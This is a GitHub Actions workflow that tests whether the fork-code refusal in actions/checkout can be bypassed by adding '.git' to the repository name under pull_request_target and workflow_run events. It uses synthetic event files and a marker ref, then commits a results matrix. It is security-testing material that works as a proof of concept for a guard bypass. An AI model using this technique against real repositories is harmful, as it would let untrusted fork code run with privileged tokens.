name: checkout-dotgit-alias-probe

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/checkout-dotgit-alias-probe.yml'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Fetch current checkout action source
        uses: actions/checkout@f548e57e544e1ff5a4c46bf1e1b8685f8e4a348a
        with:
          repository: actions/checkout
          ref: f548e57e544e1ff5a4c46bf1e1b8685f8e4a348a
          path: checkout-action-src
          persist-credentials: false

      - name: Checkout lab repository for verdict commit
        uses: actions/checkout@f548e57e544e1ff5a4c46bf1e1b8685f8e4a348a
        with:
          path: verdict-repo

      - name: Differential alias validation
        shell: bash
        env:
          TOKEN: ${{ github.token }}
          PAYLOAD_SHA: 9624afebfb3dd33f50badbbd8f11750439b0a989
        run: |
          set -u
          SRC="$GITHUB_WORKSPACE/checkout-action-src"
          RESULT="$GITHUB_WORKSPACE/verdict-repo/security-probe-results/checkout-dotgit-alias-matrix.txt"
          mkdir -p "$(dirname "$RESULT")"
          : > "$RESULT"

          run_case() {
            label="$1"
            event_name="$2"
            input_repo="$3"
            workspace="$GITHUB_WORKSPACE/case-$label"
            event="$RUNNER_TEMP/event-$label.json"
            log="$RUNNER_TEMP/log-$label.txt"
            rm -rf "$workspace"
            mkdir -p "$workspace"

            if [[ "$event_name" == "pull_request_target" ]]; then
              cat > "$event" <<EOF
          {
            "repository": {"id": 424242424, "full_name": "pratik90908/synthetic-base"},
            "pull_request": {
              "head": {
                "repo": {"id": 900807132, "full_name": "pratik90908/Project"},
                "sha": "$PAYLOAD_SHA"
              },
              "merge_commit_sha": "1111111111111111111111111111111111111111"
            }
          }
          EOF
            else
              cat > "$event" <<EOF
          {
            "repository": {"id": 424242424, "full_name": "pratik90908/synthetic-base"},
            "workflow_run": {
              "event": "pull_request",
              "head_repository": {"id": 900807132, "full_name": "pratik90908/Project"},
              "head_commit": {"id": "$PAYLOAD_SHA"},
              "head_sha": "$PAYLOAD_SHA"
            }
          }
          EOF
            fi

            set +e
            env \
              GITHUB_EVENT_NAME="$event_name" \
              GITHUB_EVENT_PATH="$event" \
              GITHUB_REPOSITORY=pratik90908/synthetic-base \
              GITHUB_WORKSPACE="$workspace" \
              INPUT_REPOSITORY="$input_repo" \
              INPUT_REF=checkout-dotgit-payload \
              INPUT_TOKEN="$TOKEN" \
              node "$SRC/dist/index.js" > "$log" 2>&1
            exit_code=$?
            set -e

            echo "${label}.event=$event_name" >> "$RESULT"
            echo "${label}.input_repository=$input_repo" >> "$RESULT"
            echo "${label}.exit=$exit_code" >> "$RESULT"
            if grep -q 'Refusing to check out fork pull request code' "$log"; then
              echo "${label}.guard_refused=true" >> "$RESULT"
            else
              echo "${label}.guard_refused=false" >> "$RESULT"
            fi
            if [[ -f "$workspace/checkout-dotgit-marker.txt" ]] && grep -q 'CHECKOUT_DOTGIT_ALIAS_MARKER' "$workspace/checkout-dotgit-marker.txt"; then
              echo "${label}.marker=true" >> "$RESULT"
            else
              echo "${label}.marker=false" >> "$RESULT"
            fi
            if git -C "$workspace" rev-parse HEAD >/dev/null 2>&1; then
              echo "${label}.head=$(git -C "$workspace" rev-parse HEAD)" >> "$RESULT"
              echo "${label}.origin=$(git -C "$workspace" remote get-url origin 2>/dev/null || true)" >> "$RESULT"
            else
              echo "${label}.head=" >> "$RESULT"
              echo "${label}.origin=" >> "$RESULT"
            fi
          }

          run_case pr_target_control pull_request_target pratik90908/Project
          run_case pr_target_dotgit pull_request_target pratik90908/Project.git
          run_case workflow_run_control workflow_run pratik90908/Project
          run_case workflow_run_dotgit workflow_run pratik90908/Project.git

      - name: Commit verdict
        if: always()
        shell: bash
        run: |
          set -euo pipefail
          cd verdict-repo
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add security-probe-results/checkout-dotgit-alias-matrix.txt
          git commit -m 'Record checkout dotgit alias differential matrix' || exit 0
          git push
